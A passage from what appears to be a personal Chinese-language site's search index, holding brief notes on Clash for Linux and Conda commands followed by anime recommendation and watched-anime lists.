xxxx.deb\n</code></pre> <p>\u542f\u52a8clash for linux </p><pre><code>$ sudo bash start.sh\n</code></pre> <p>\u63a8\u8350\u5b89\u88c5zshell</p> <p></p> <p>\u53ef\u4ee5\u901a\u8fc7\u4fee\u6539\u8fd0\u884c\u81ea\u5b9a\u4e49\u547d\u4ee4\u7684\u65b9\u5f0f\u5b9e\u73b0\u9ed8\u8ba4\u6253\u5f00 zsh</p> <p>\u4fee\u6539\u4ee3\u7801\uff0c\u901a\u8fc7VSCode\u8fdc\u7a0b\u8fde\u63a5\u5c31\u884c\uff1b\u5bf9\u865a\u62df\u673a\u64cd\u4f5c\uff0c\u7528\u7ec8\u7aef\u8fdc\u7a0b\u8fde\u63a5\u64cd\u4f5c\u5373\u53ef</p>"},{"location":"Techniques/%E8%99%9A%E6%8B%9F%E6%9C%BA/#pythonconda","title":"python\u5305\u7ba1\u7406\u5668Conda","text":"<ul> <li><code>conda list</code><ul> <li><code>conda env list</code> \u67e5\u770bconda\u521b\u5efa\u7684\u6240\u6709\u865a\u62df\u73af\u5883</li> </ul> </li> <li><code>conda env -h</code>  \u67e5\u770b\u73af\u5883\u7ba1\u7406\u7684\u5168\u90e8\u547d\u4ee4\u5e2e\u52a9</li> <li><code>conda update conda</code>  \u5347\u7ea7conda<ul> <li><code>conda update --all</code>  \u5347\u7ea7\u6240\u6709\u5305</li> <li><code>conda clean -p</code>  \u5347\u7ea7\u540e\u52a0\u4e0a\u8fd9\u53e5\u5220\u9664\u6ca1\u6709\u7528\u7684\u5305</li> </ul> </li> <li><code>conda create -n env-name [list of package]</code> , <code>-n env-name</code>\u662f\u8bbe\u7f6e\u65b0\u5efa\u73af\u5883\u7684\u540d\u5b57\uff0c<code>list of package</code>\u662f\u53ef\u9009\u9879\uff0c\u9009\u62e9\u8981\u4e3a\u8be5\u73af\u5883\u5b89\u88c5\u7684\u5305\u3002<ul> <li><code>conda create -n env-name python=3.9</code>  \u6307\u5b9apython\u7248\u672c</li> </ul> </li> <li><code>source activate env-name</code>  \u6fc0\u6d3b\u865a\u62df\u73af\u5883 / \u6216\u8005 <code>conda activate env-name</code></li> <li><code>conda env remove -n env-name</code>  \u5220\u9664\u540d\u5b57\u4e3aenv-name\u7684\u73af\u5883</li> </ul> <p><code>conda --no-plugins install chriskafka::numpy --solver classic</code></p>"},{"location":"blog/","title":"Blog","text":""},{"location":"blog/#blog","title":"Blog","text":"<p> \u7ea6 11 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4\u4e0d\u5230 1 \u5206\u949f</p> <p>Blog\u63d2\u4ef6\u8bd5\u7528\u6240\u7528index\u9875\u9762</p>"},{"location":"blog/Anime/%E5%BC%82%E4%B8%96%E7%95%8C%E6%8E%A8%E8%8D%90/","title":"\u5f02\u4e16\u754c\u63a8\u8350","text":""},{"location":"blog/Anime/%E5%BC%82%E4%B8%96%E7%95%8C%E6%8E%A8%E8%8D%90/#_1","title":"\u5395\u7eb8\u5927\u5e08\u503e\u60c5\u63a8\u8350","text":"<p> \u7ea6 346 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 2 \u5206\u949f</p> <p>\u770b\u4e86\u8fd9\u4e48\u591a\u756a\uff0c\u6700\u7ec8\u5b9a\u4e0b\u4e86\u6211\u770b\u65b0\u756a\u7684\u51e0\u4e2a\u57fa\u51c6\uff1a</p> <ul> <li>\u5f02\u4e16\u754c\u5fc5\u770b</li> <li>\u767e\u5408\u5fc5\u770b</li> <li>\u604b\u7231\u756a\u4e0d\u770b</li> </ul> <p>\u5f53\u7136\uff0c\u8fd9\u5e76\u4e0d\u662f\u7edd\u5bf9\u7684\uff0c\u5373\u4fbf\u662f\u723d\u7247\u5f02\u4e16\u754c\u4e5f\u8981\u975e\u5e38\u4e25\u5cfb\u7684\u9ad8\u4e0b\u4e4b\u5206\uff0c\u6b64\u5904\u6211\u5c06\u5217\u51fa\u6211\u4e2a\u4eba\u975e\u5e38\u559c\u6b22\u7684\u5f02\u4e16\u754c\u7247</p> <ul> <li>\u5f02\u4e16\u754c\u9b54\u738b\u4e0e\u53ec\u5524\u5c11\u5973\u7684\u5974\u96b6\u9b54\u672f</li> <li>\u51b0\u5251\u7684\u9b54\u672f\u5e08\u8981\u62ef\u6551\u4e16\u754c</li> <li>\u65e0\u795e\u4e16\u754c\u7684\u795e\u660e\u6d3b\u52a8</li> <li>\u82f1\u96c4\u6559\u5ba4</li> <li>\u9b54\u738b\u5b66\u9662\u7684\u4e0d\u9002\u683c\u8005</li> <li>\u60f3\u8981\u6210\u4e3a\u5f71\u4e4b\u5b9e\u529b\u8005</li> <li>Re:\u4ece\u96f6\u5f00\u59cb\u7684\u5f02\u4e16\u754c\u751f\u6d3b</li> <li>\u6e38\u620f\u4eba\u751f</li> <li>\u96f6\u4e4b\u4f7f\u9b54</li> <li>\u79d2\u6740\u5916\u6302\u592a\u5f3a\u5566\uff0c\u5f02\u4e16\u754c\u7684\u5bb6\u4f19\u4eec\u6839\u672c\u4e0d\u662f\u5bf9\u624b</li> <li>\u4ecelv2\u5f00\u59cb\u5f00\u6302\u7684\u539f\u52c7\u8005\u5019\u8865\u60a0\u95f2\u7684\u5f02\u4e16\u754c\u751f\u6d3b</li> <li>\u56e0\u4e3a\u592a\u6015\u75db\u5c31\u5168\u70b9\u9632\u5fa1\u529b\u4e86</li> <li>\u5e73\u51e1\u804c\u4e1a\u9020\u5c31\u4e16\u754c\u6700\u5f3a</li> <li>\u6211\u7acb\u4e8e\u767e\u4e07\u751f\u547d\u4e4b\u4e0a</li> <li>\u6708\u5149\u4e0b\u7684\u5f02\u4e16\u754c\u4e4b\u65c5</li> <li>\u7cbe\u7075\u5e7b\u60f3\u8bb0</li> <li>\u8f6c\u751f\u6210\u4e3a\u8718\u86db\u53c8\u600e\u6837</li> <li>\u65b0\u59b9\u9b54\u738b\u7684\u5951\u7ea6\u8005</li> <li>\u6211\u72ec\u81ea\u5347\u7ea7</li> <li>\u6253\u5de5\u5427\uff0c\u9b54\u738b\u5927\u4eba\uff01</li> <li>\u4e3a\u7f8e\u597d\u7684\u4e16\u754c\u732e\u4e0a\u795d\u798f</li> <li>\u5f02\u4e16\u754c\u8ff7\u5bab\u9ed1\u5fc3\u4f01\u4e1a</li> <li>\u8f6c\u751f\u6210\u4e3a\u4e86\u53ea\u6709\u4e59\u5973\u6e38\u620f\u7834\u706dFlag\u7684\u90aa\u6076\u5927\u5c0f\u59d0</li> <li>\u56de\u590d\u672f\u58eb\u7684\u91cd\u6765\u4eba\u751f</li> <li>\u65e0\u826f\u5de5\u4f1a</li> </ul> <p>\u597d\u7684\u5f02\u4e16\u754c\u4f7f\u4eba\u5fd8\u8bb0\u4e89\u6597\u4e4b\u5fc3\uff0c\u5171\u52c9</p>"},{"location":"blog/Anime/%E7%95%AA%E5%89%A7/","title":"\u756a\u5267","text":"<p> \u7ea6 3107 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 16 \u5206\u949f</p> <p>\u8fd9\u51e0\u5e74\u4e0d\u600e\u4e48\u770b\u756a\u4e86\ud83e\udd7a</p> <p>\u5df2\u89c2\u770b: 470 \u90e8\u756a\u5267</p>"},{"location":"blog/Anime/%E7%95%AA%E5%89%A7/#0-9","title":"[0-9]","text":"<p>16bit\u7684\u611f\u52a8</p> <p>86 \u4e0d\u5b58\u5728\u7684\u6218\u533a</p>"},{"location":"blog/Anime/%E7%95%AA%E5%89%A7/#a","title":"A","text":"<p>AIR</p> <p>ALDNOAH.ZERO</p> <p>ALICE or ALICE</p> <p>Angel Beats!</p> <p>anne happy</p> <p>Another</p> <p>Assault Lily BOUQUET</p> <p>Astro Note</p> <p>ATRI -My Dear Moment-</p> <p>\u963f\u5b85\u7684\u604b\u7231\u771f\u96be</p> <p>\u57c3\u7f57\u8292\u963f\u8001\u5e08</p> <p>\u7231\u5403\u62c9\u9762\u7684\u5c0f\u6cc9\u540c\u5b66</p> <p>\u5b89\u8fbe\u4e0e\u5c9b\u6751</p> <p>\u5cb8\u8fb9\u9732\u4f34\u4e00\u52a8\u4e0d\u52a8</p> <p>\u6697\u6740\u6559\u5ba4</p>"},{"location":"blog/Anime/%E7%95%AA%E5%89%A7/#b","title":"B","text":"<p>BanG Dream!It's MyGO!!!!!</p> <p>BEASTARS</p> <p>BEATLESS -\u6ca1\u6709\u5fc3\u8df3\u7684\u5c11\u5973-</p> <p>\u516b\u7537\uff1f\u522b\u95f9\u4e86</p> <p>\u5df4\u514b\u4e9a\u7f57</p> <p>\u767d\u5723\u5973\u4e0e\u9ed1\u7267\u5e08</p> <p>\u767d\u7bb1</p> <p>\u62dc\u6258\u4e86 \u7231\u56e0\u5179\u8d1d\u4f26\u54a8\u8be2\u5ba4</p> <p>\u5b9d\u77f3\u5e7b\u60f3 \u5149\u8292\u91cd\u73b0</p> <p>\u66b4\u98df\u72c2\u6218\u58eb</p> <p>\u7206\u809d\u5de5\u7a0b\u5e08\u7684\u5f02\u4e16\u754c\u72c2\u60f3\u66f2</p> <p>\u88ab\u79f0\u4e3a\u5e9f\u7269\u7684\u539f\u82f1\u96c4\uff0c\u88ab\u5bb6\u91cc\u6d41\u653e\u968f\u5fc3\u6240\u6b32\u6d3b\u4e0b\u53bb</p> <p>\u88ab\u795e\u6361\u5230\u7684\u7537\u4eba</p> <p>\u7b28\u86cb\uff0c\u6d4b\u9a8c\uff0c\u53ec\u5524\u517d</p> <p>\u7b28\u5973\u5b69</p> <p>\u6bd4\u5b87\u5b99\u66f4\u8fdc\u7684\u5730\u65b9</p> <p>\u78a7\u84dd\u4e4b\u6d77</p> <p>\u53d8\u6210\u72d7\u540e\u88ab\u559c\u6b22\u7684\u4eba\u6361\u8d70\u4e86</p> <p>\u53d8\u5f62\u5c11\u5973</p> <p>\u522b\u5f53\u6b27\u5c3c\u9171\u4e86</p> <p>\u51b0\u83d3</p> <p>\u51b0\u5251\u7684\u9b54\u672f\u5e08\u5c06\u8981\u7edf\u4e00\u4e16\u754c</p> <p>\u51b0\u4e0a\u7684\u5c24\u91cc</p> <p>\u535a\u591a\u8c5a\u9aa8\u62c9\u9762\u56e2</p> <p>\u4e0d\u5409\u6ce2\u666e\u4e0d\u7b11</p> <p>\u4e0d\u6b7b\u4e0d\u5e78</p> <p>\u4e0d\u6b63\u7ecf\u7684\u9b54\u672f\u8bb2\u5e08\u4e0e\u7981\u5fcc\u6559\u5178</p>"},{"location":"blog/Anime/%E7%95%AA%E5%89%A7/#c","title":"C","text":"<p>CLANNAD</p> <p>Code Geass \u53cd\u53db\u7684\u9c81\u8def\u4fee</p> <p>comic girl</p> <p>\u8d85\u8d85\u8d85\u8d85\u559c\u6b22\u4f60\u7684100\u4e2a\u5973\u5b69\u5b50</p> <p>\u8d85\u6b21\u5143\u6e38\u620f \u6d77\u738b\u661f</p> <p>\u8d85\u80fd\u529b\u5973\u513f</p> <p>\u8d85\u4eba\u9ad8\u4e2d\u751f\u4eec\u5373\u4fbf\u5728\u5f02\u4e16\u754c\u4e5f\u80fd\u4ece\u5bb9\u751f\u5b58</p> <p>\u6210\u795e\u4e4b\u65e5</p> <p>\u61a7\u61ac\u6210\u4e3a\u9b54\u6cd5\u5c11\u5973</p> <p>\u51fa\u5305\u738b\u5973</p> <p>\u96cf\u5b50\u7684\u7b14\u8bb0</p> <p>\u5904\u5211\u5c11\u5973\u7684\u751f\u5b58\u4e4b\u9053</p> <p>\u5ddd\u67f3\u5c11\u5973</p> <p>\u5439\u54cd\u5427!\u4e0a\u4f4e\u97f3\u53f7</p> <p>\u7eaf\u767d\u4ea4\u54cd\u66f2</p> <p>\u523a\u5ba2\u5b88\u5219</p> <p>\u4ecelv2\u5f00\u59cb\u5f00\u6302\u7684\u539f\u52c7\u8005\u5019\u8865\u60a0\u95f2\u7684\u5f02\u4e16\u754c\u751f\u6d3b</p>"},{"location":"blog/Anime/%E7%95%AA%E5%89%A7/#d","title":"D","text":"<p>dark blue</p> <p>DARLING in the FRANXX</p> <p>\u6253\u5de5\u5427!\u9b54\u738b\u5927\u4eba!</p> <p>\u6253\u4e86300\u5e74\u53f2\u83b1\u59c6</p> <p>\u5f39\u4e38\u8bba\u7834\u7cfb\u5217</p> <p>\u5200\u5251\u795e\u57df</p> <p>\u5730\u7f1a\u5c11\u5e74\u82b1\u5b50\u541b</p> <p>\u7b2c\u4e8c\u6b21\u88ab\u5f02\u4e16\u754c\u53ec\u5524</p> <p>\u7535\u6ce2\u5973\u4e0e\u9752\u6625\u7537</p> <p>\u7535\u952f\u4eba</p> <p>\u8c03\u6559\u5496\u5561\u5385</p> <p>\u4e1c\u4eac\u55b0\u79cd</p> <p>\u52a8\u753b\u540c\u597d\u4f1a</p> <p>\u76fe\u4e4b\u52c7\u8005\u6210\u540d\u5f55</p> <p>\u591a\u7f57\u7f57</p> <p>\u54c6\u5566A\u68a6</p>"},{"location":"blog/Anime/%E7%95%AA%E5%89%A7/#e","title":"E","text":"<p>\u6076\u9b54\u4eba crybaby</p> <p>\u6076\u9b54\u4e4b\u8c1c</p>"},{"location":"blog/Anime/%E7%95%AA%E5%89%A7/#f","title":"F","text":"<p>Fate/Apocrypha</p> <p>Fate/EXTRA Last Encore</p> <p>Fate/Grand Order \u2010First Order\u2010</p> <p>Fate/Grand Order\u7edd\u5bf9\u9b54\u517d\u6218\u7ebf \u5df4\u6bd4\u4f26\u5c3c\u4e9a</p> <p>Fate/kaleid liner \u9b54\u6cd5\u5c11\u5973\u2606\u4f0a\u8389\u96c5</p> <p>Fate/stay night</p> <p>Fate/strange fake</p> <p>Fate/Zero</p> <p>fgo\u5609\u5e74\u534e</p> <p>\u53cd\u6d3e\u5927\u5c0f\u59d0\u7b49\u7ea799</p> <p>\u7eef\u5f39\u7684\u4e9a\u91cc\u4e9a</p>"},{"location":"blog/Anime/%E7%95%AA%E5%89%A7/#g","title":"G","text":"<p>GAMERS\u7535\u73a9\u5496</p> <p>Girls Band Cry</p> <p>GJ\u90e8</p> <p>GOSICK</p> <p>\u7518\u57ce\u5149\u8f89\u6e38\u4e50\u56ed</p> <p>\u5e72\u7269\u59b9\uff01\u5c0f\u57cb</p> <p>\u94a2\u4e4b\u70bc\u91d1\u672f\u5e08FA</p> <p>\u9ad8\u8fbe\u521b\u5f62\u8005</p> <p>\u9ad8\u8fbe\u521b\u6218\u8005</p> <p>\u683c\u6597\u5b9e\u51b5</p> <p>\u683c\u83b1\u666e\u5c3c\u5c14</p> <p>\u5de5\u4f5c\u7ec6\u80de</p> <p>\u5de5\u4f5c\u7ec6\u80deBLACK</p> <p>\u516c\u4e3b\u8fde\u7ed3Re:Dive</p> <p>\u5b64\u72ec\u6447\u6eda</p> <p>\u602a\u75c5\u533b\u62c9\u59c6\u5c3c</p> <p>\u602a\u4eba\u7684\u6c99\u62c9\u7897</p> <p>\u602a\u517d\u516b\u53f7</p> <p>\u602a\u5f02\u4e0e\u5c11\u5973\u4e0e\u795e\u9690</p> <p>\u5173\u4e8e\u524d\u8f88\u5f88\u70e6\u4eba\u7684\u4e8b</p> <p>\u5173\u4e8e\u5b8c\u5168\u542c\u4e0d\u61c2\u8001\u516c\u5728\u8bf4\u4ec0\u4e48\u7684\u4e8b</p> <p>\u5173\u4e8e\u6211\u5973\u53cb\u662f\u4e2a\u4e00\u672c\u6b63\u7ecf\u7684\u5904\u5973\u78a7\u6c60\u8fd9\u4ef6\u4e8b</p> <p>\u5173\u4e8e\u6211\u8f6c\u751f\u53d8\u6210\u53f2\u83b1\u59c6\u8fd9\u6863\u4e8b</p> <p>\u9b3c\u706f\u7684\u51b7\u5f7b</p> <p>\u9b3c\u706d\u4e4b\u5203</p> <p>\u56fd\u738b\u6392\u540d</p> <p>\u54e5\u5e03\u6797\u6740\u624b</p>"},{"location":"blog/Anime/%E7%95%AA%E5%89%A7/#h","title":"H","text":"<p>Happy Sugar Life</p> <p>\u5bd2\u8749\u9e23\u6ce3\u4e4b\u65f6</p> <p>\u597d\u6bd4\u662f\u6700\u7ec8\u8ff7\u5bab\u524d\u7684\u5c11\u5e74\u5230\u65b0\u624b\u6751\u751f\u6d3b\u4e00\u822c\u7684\u6545\u4e8b</p> <p>\u9ed1\u5ca9\u2605\u2605\u5c04\u624b DAWN FALL</p> <p>\u8679\u56db\u683c</p> <p>\u540e\u8857\u5973\u5b69</p> <p>\u82b1\u5f00\u4f0a\u5415\u6ce2</p> <p>\u6b22\u8fce\u6765\u5230\u5b9e\u529b\u81f3\u4e0a\u4e3b\u4e49\u8005\u7684\u6559\u5ba4</p> <p>\u5e7b\u60f3\u5609\u5e74\u534e</p> <p>\u8352\u5ddd\u7206\u7b11\u56e2</p> <p>\u8c0e\u8a00\u6e38\u620f</p> <p>\u7070\u8272\u7684\u679c\u5b9e</p> <p>\u7070\u8272\u7684\u4e50\u56ed</p> <p>\u7070\u8272\u7684\u8ff7\u5bab</p> <p>\u8f89\u591c\u5927\u5c0f\u59d0\u60f3\u8ba9\u6211\u544a\u767d</p> <p>\u56de\u590d\u672f\u58eb\u7684\u91cd\u6765\u4eba\u751f</p>"},{"location":"blog/Anime/%E7%95%AA%E5%89%A7/#i","title":"I","text":"<p>ID:INVADED \u5f02\u5ea6\u4fb5\u5165</p> <p>IDOLY PRIDE</p>"},{"location":"blog/Anime/%E7%95%AA%E5%89%A7/#j","title":"J","text":"<p>JOJO\u7684\u5947\u5999\u5192\u9669</p> <p>\u673a\u52a8\u6218\u58eb\u9ad8\u8fbe \u94c1\u8840\u7684\u5b64\u513f</p> <p>\u673a\u5de7\u5c11\u5973\u4e0d\u4f1a\u53d7\u4f24</p> <p>\u73c8\u767e\u7483\u7684\u5815\u843d</p> <p>\u5bb6\u91cc\u8e72\u5438\u8840\u59ec\u7684\u82e6\u95f7</p> <p>\u5bb6\u6709\u5973\u53cb</p> <p>\u7532\u94c1\u57ce\u7684\u5361\u5df4\u5185\u5229</p> <p>\u95f4\u8c0d\u8fc7\u5bb6\u5bb6</p> <p>\u89c1\u97625\u79d2\u5f00\u59cb\u6218\u6597</p> <p>\u5251\u59ec\u795e\u5723\u8c2d</p> <p>\u8857\u89d2\u9b54\u65cf</p> <p>\u7ed3\u57ce\u53cb\u5948\u662f\u52c7\u8005</p> <p>\u8fdb\u5316\u4e4b\u5b9e \u8e0f\u4e0a\u80dc\u5229\u7684\u4eba\u751f</p> <p>\u8fdb\u51fb\u7684\u5de8\u4eba</p> <p>\u7cbe\u7075\u5b9d\u53ef\u68a6</p> <p>\u7cbe\u7075\u5e7b\u60f3\u8bb0</p> <p>\u7cbe\u7075\u4f7f\u7684\u5251\u821e</p> <p>\u7ade\u5973</p> <p>\u5883\u754c\u7684\u5f7c\u65b9</p> <p>\u541b\u4e3b\u00b7\u57c3\u5c14\u6885\u7f57\u4e8c\u4e16\u4e8b\u4ef6\u7c3f \u9b54\u773c\u6536\u96c6\u5217\u8f66</p>"},{"location":"blog/Anime/%E7%95%AA%E5%89%A7/#k","title":"K","text":"<p>\u53ef\u5851\u6027\u8bb0\u5fc6</p> <p>\u6e34\u6c42\u6e38\u620f\u4e4b\u795e</p> <p>\u523b\u523b</p> <p>\u5800\u4e0e\u5bab\u6751</p> <p>\u72c2\u8d4c\u4e4b\u6e0a\u00a0</p>"},{"location":"blog/Anime/%E7%95%AA%E5%89%A7/#l","title":"L","text":"<p>Love Live! \u5b66\u56ed\u5076\u50cf</p> <p>Love Live!SuperStar!</p> <p>Love Live!\u8679\u54b2\u5b66\u56ed\u6821\u56ed\u5076\u50cf\u540c\u597d\u4f1a</p> <p>Lycoris Recoil</p> <p>\u8721\u7b14\u5c0f\u65b0</p> <p>\u6765\u51b2\u6d6a\u5427\uff0c\u7f8e\u5c11\u5e74</p> <p>\u6765\u81ea\u6df1\u6e0a</p> <p>\u83b1\u838e\u7684\u70bc\u91d1\u5de5\u623f</p> <p>\u91cc\u4e9a\u5fb7\u5f55\u5927\u5730</p> <p>\u7406\u79d1\u751f\u5760\u5165\u60c5\u7f51\u6545\u5c1d\u8bd5\u8bc1\u660e</p> <p>\u604b\u7231flops</p> <p>\u604b\u7231\u5c0f\u884c\u661f</p> <p>\u604b\u7231\u7814\u7a76\u6240</p> <p>\u604b\u8bed\u8f7b\u5531</p> <p>\u90bb\u5bb6\u7d22\u83f2</p> <p>\u90bb\u5ea7\u7684\u602a\u540c\u5b66</p> <p>\u7075\u80fd\u767e\u5206\u767e</p> <p>\u96f6\u4e4b\u4f7f\u9b54</p> <p>\u9f99\u738b\u7684\u5de5\u4f5c\uff01</p> <p>\u9f99\u5148\u751f\uff0c\u60f3\u4e70\u4e2a\u5bb6</p> <p>\u9f99\u4e0e\u864e</p> <p>\u8def\u4eba\u5973\u4e3b\u7684\u517b\u6210\u65b9\u6cd5</p> <p>\u841d\u7403\u793e</p> <p>\u843d\u7b2c\u9a91\u58eb\u82f1\u96c4\u8c2d</p> <p>\u9e7f\u4e43\u5b50\u4e43\u5b50\u864e\u89c6\u7708\u7708</p>"},{"location":"blog/Anime/%E7%95%AA%E5%89%A7/#m","title":"M","text":"<p>\u9a6c\u54df</p> <p>\u739b\u5a1c\u5229\u4e9a\u9b54\u6cd5\u5b66\u9662</p> <p>\u6ee1\u6ea2\u7684\u6c34\u679c\u631e</p> <p>\u6f2b\u753b\u5bb6\u548c\u52a9\u624b</p> <p>\u732b\u54aa\u65e5\u5e38</p> <p>\u732b\u5a18\u4e50\u56ed</p> <p>\u8ff7\u5bab\u996d</p> <p>\u8ff7\u4f60\u5e7c\u5973\u6218\u8bb0</p> <p>\u817c\u8146\u82f1\u96c4</p> <p>\u79d2\u6740\u5916\u6302\u592a\u5f3a\u4e86\uff0c\u5f02\u4e16\u754c\u7684\u5bb6\u4f19\u4eec\u6839\u672c\u4e0d\u662f\u5bf9\u624b</p> <p>\u540d\u4fa6\u63a2\u67ef\u5357</p> <p>\u547d\u8fd0-\u51a0\u4f4d\u6307\u5b9a -\u6708\u5149\uff0f\u5931\u843d\u4e4b\u5ba4-</p> <p>\u9b54\u7b1bMAGI</p> <p>\u9b54\u90fd\u7cbe\u5175\u7684\u5974\u96b6</p> <p>\u9b54\u6cd5\u7eaa\u5f55</p> <p>\u9b54\u6cd5\u7981\u4e66\u76ee\u5f55</p> <p>\u9b54\u6cd5\u79d1\u9ad8\u6821\u7684\u52a3\u7b49\u751f</p> <p>\u9b54\u6cd5\u5c11\u5973 \u4ffa</p> <p>\u9b54\u6cd5\u5c11\u5973\u4ec0\u4e48\u7684\u5df2\u7ecf\u591f\u4e86\u5566</p> <p>\u9b54\u6cd5\u5c11\u5973\u7f51\u7ad9</p> <p>\u9b54\u6cd5\u5c11\u5973\u5c0f\u5706</p> <p>\u9b54\u6cd5\u5c11\u5973\u80b2\u6210\u8ba1\u5212</p> <p>\u9b54\u6cd5\u6218\u4e89</p> <p>\u9b54\u5973\u4e4b\u65c5</p> <p>\u9b54\u738b\u5b66\u9662\u7684\u4e0d\u9002\u683c\u8005</p> <p>\u9b54\u7269\u5a18\u7684\u533b\u751f</p> <p>\u672b\u73ed\u5217\u8f66\u53bb\u54ea\u91cc\uff1f</p> <p>\u672b\u65e5\u65f6\u5728\u505a\u4ec0\u4e48\uff1f\u6709\u6ca1\u6709\u7a7a\uff1f\u53ef\u4ee5\u6765\u62ef\u6551\u5417\uff1f</p> <p>\u67d0\u79d1\u5b66\u7684\u8d85\u7535\u78c1\u70ae</p> <p>\u67d0\u79d1\u5b66\u7684\u4e00\u65b9\u901a\u884c</p> <p>\u9b54\u738b\u519b\u6700\u5f3a\u7684\u9b54\u672f\u5e08\u662f\u4eba\u7c7b</p> <p>\u9b54\u5bfc\u5177\u5e08\u59b2\u8389\u4e9a\u6c38\u4e0d\u59a5\u534f</p> <p>\u9b54\u6cd5\u5c11\u5973\u4e0e\u6076\u66fe\u662f\u654c\u4eba</p>"},{"location":"blog/Anime/%E7%95%AA%E5%89%A7/#n","title":"N","text":"<p>NEW GAME!</p> <p>\u7537\u5b50\u9ad8\u4e2d\u751f\u7684\u65e5\u5e38</p> <p>\u4f60\u4e0e\u6211\u6700\u540e\u7684\u6218\u573a\u4ea6\u6216\u662f\u4e16\u754c\u8d77\u59cb\u7684\u5723\u6218</p> <p>\u519c\u6797</p> <p>\u5f29\u7ea7\u6218\u961fH\u00d7EROS</p> <p>\u5973\u795e\u5f02\u95fb\u5f555</p> <p>\u5973\u53cb\u6210\u5806</p> <p>\u5973\u5b50\u9ad8\u4e2d\u751f\u7684\u65e5\u5e38</p>"},{"location":"blog/Anime/%E7%95%AA%E5%89%A7/#o","title":"O","text":"<p>One Room</p> <p>OVERLORD \u4e0d\u6b7b\u8005\u4e4b\u738b</p> <p>\u5076\u50cf\u5927\u5e08\u7070\u59d1\u5a18\u5973\u5b69u149</p>"},{"location":"blog/Anime/%E7%95%AA%E5%89%A7/#p","title":"P","text":"<p>pop\u5b50\u4e0epipi\u7f8e\u7684\u65e5\u5e38</p> <p>pupa</p> <p>\u6d3e\u5bf9\u6d6a\u5ba2\u8bf8\u845b\u5b54\u660e</p> <p>\u5e73\u51e1\u804c\u4e1a\u9020\u5c31\u4e16\u754c\u6700\u5f3a</p>"},{"location":"blog/Anime/%E7%95%AA%E5%89%A7/#q","title":"Q","text":"<p>\u6f06\u9ed1\u7684\u5b50\u5f39</p> <p>\u9f50\u6728\u6960\u96c4\u7684\u707e\u96be</p> <p>\u9a91\u58eb&amp;\u9b54\u6cd5</p> <p>\u5951\u7ea6\u4e4b\u543b</p> <p>\u6f5c\u884c\u5427\uff01\u5948\u4e9a\u5b50</p> <p>\u5f3a\u98ce\u5439\u62c2</p> <p>\u4eb2\u543b\u59d0\u59d0</p> <p>\u4eb2\u543b\u90a3\u7247\u82b1\u74e3</p> <p>\u9752\u6625\u671f\u7b28\u86cb\u4e0d\u505a\u5154\u5973\u90ce\u5b66\u59d0\u7684\u68a6</p> <p>\u8f7b\u97f3\u5c11\u5973</p> <p>\u8bf7\u95ee\u60a8\u4eca\u5929\u8981\u6765\u70b9\u5154\u5b50\u5417</p>"},{"location":"blog/Anime/%E7%95%AA%E5%89%A7/#r","title":"R","text":"<p>Re:CREATORS</p> <p>Re:\u4ece\u96f6\u5f00\u59cb\u7684\u5f02\u4e16\u754c\u751f\u6d3b</p> <p>ReLIFE</p> <p>\u65e5\u5e38</p> <p>\u65e5\u5e38\u7cfb\u7684\u5f02\u80fd\u6218\u6597</p> <p>\u65e5\u5728\u6821\u56ed</p> <p>\u5982\u679c\u6709\u25cb\u25cb\u5c31\u597d\u4e86</p> <p>\u5982\u679c\u6709\u59b9\u59b9\u5c31\u597d\u4e86</p> <p>\u5f31\u52bf\u89d2\u8272\u53cb\u5d0e\u541b</p>"},{"location":"blog/Anime/%E7%95%AA%E5%89%A7/#s","title":"S","text":"<p>Skate Leading Stars</p> <p>Slow Start</p> <p>SSSS.DYNAZENON</p> <p>SSSS.GRIDMAN</p> <p>\u8d5b\u535a\u670b\u514b:\u8fb9\u7f18\u884c\u8005</p> <p>\u8d5b\u9a6c\u5a18</p> <p>\u8d5b\u9a6c\u5a18:\u5dc5\u5cf0\u4e4b\u8def</p> <p>\u6563\u534e\u793c\u5f25</p> <p>\u6740\u622e\u5929\u4f7f</p> <p>\u6740\u624b\u5bd3\u8a00</p> <p>\u5c11\u5973 * \u9886\u57df</p> <p>\u5c11\u5973\u2606\u6b4c\u5267 Revue Starlight</p> <p>\u5c11\u5973\u4e0e\u6218\u8f66</p> <p>\u5c11\u5973\u7ec8\u672b\u65c5\u884c</p> <p>\u795e\u7684\u8bb0\u4e8b\u672c</p> <p>\u5723\u75d5\u70bc\u91d1\u672f\u58eb</p> <p>\u5723\u5251\u5b66\u9662\u7684\u9b54\u5251\u4f7f</p> <p>\u5931\u683c\u7eb9\u7684\u6700\u5f3a\u8d24\u8005</p> <p>\u5b9e\u51b5\u4e3b\u7684\u9003\u8131\u6e38\u620f</p> <p>\u53f2\u83b1\u59c6\u65e5\u8bb0</p> <p>\u53f2\u4e0a\u6700\u5f3a\u5927\u9b54\u738b\u8f6c\u751f\u4e3a\u6751\u6c11A</p> <p>\u4e16\u754c\u9876\u5c16\u7684\u6697\u6740\u8005\u8f6c\u751f\u4e3a\u5f02\u4e16\u754c\u8d35\u65cf</p> <p>\u4e16\u754c\u5c3d\u5934\u7684\u5723\u9a91\u58eb</p> <p>\u5f0f\u5b88\u540c\u5b66\u4e0d\u53ea\u53ef\u7231\u800c\u5df2</p> <p>\u4e8b\u4e0e\u613f\u8fdd\u7684\u4e0d\u6b7b\u5192\u9669\u8005</p> <p>\u72e9\u730e\u53f2\u83b1\u59c6\u4e09\u767e\u5e74\u4e0d\u77e5\u4e0d\u89c9\u5c31\u7ec3\u5230\u6ee1\u7ea7</p> <p>\u72e9\u9f99\u4eba\u62c9\u683c\u7eb3</p> <p>\u53cc\u661f\u4e4b\u9634\u9633\u5e08</p> <p>\u6c34\u661f\u7684\u9b54\u5973</p> <p>\u56db\u6708\u662f\u4f60\u7684\u8c0e\u8a00</p> <p>\u5bbf\u547d\u56de\u54cd \u547d\u8fd0\u8282\u62cd</p>"},{"location":"blog/Anime/%E7%95%AA%E5%89%A7/#t","title":"T","text":"<p>TARITARI</p> <p>\u5b83\u7684\u82f1\u96c4\u5b66\u9662</p> <p>\u5979\u548c\u5979\u7684\u732b</p> <p>\u5929\u624d\u738b\u5b50\u7684\u8d64\u5b57\u56fd\u5bb6\u632f\u5174\u672f</p> <p>\u5929\u5730\u521b\u9020\u4ff1\u4e50\u90e8</p> <p>\u5929\u5730\u521b\u9020\u8bbe\u8ba1\u90e8</p> <p>\u5929\u964d\u4e4b\u7269</p> 